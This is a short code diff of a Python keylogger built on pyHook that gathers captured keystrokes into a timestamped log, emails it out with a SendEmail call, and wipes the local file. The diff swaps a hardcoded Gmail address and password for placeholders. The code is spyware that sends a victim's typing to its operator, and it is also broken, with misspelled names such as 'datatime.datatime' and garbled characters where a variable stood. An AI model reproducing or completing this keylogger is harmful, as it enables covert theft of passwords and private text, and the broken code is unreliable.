@@ -1,4 +1,3 @@
-# -*- coding: cp1252 -*-
 import pyHook, pythoncom, sys, logging
 import time, datetime
 
@@ -36,7 +35,7 @@ def FormatAndSendLogEmail():
         acutualdate = datatime.datatime.now().strftime("%Y-%m-%d %H:%M:%S")
         data = f.read().replace('\n','');
         data = 'Log capturado a las : '+ actualdate + '\n' + data
-        SendEmail('lucifer77xdxd@gmail.com', 'passw45HOLA', 'lucifer77xdxd@gmail.com','nuevo log - '+actualdate,data);
+        SendEmail('email', 'passw', 'email','nuevo log - '+actualdate,data);
         �.seek(0)
         �.truncate()
         
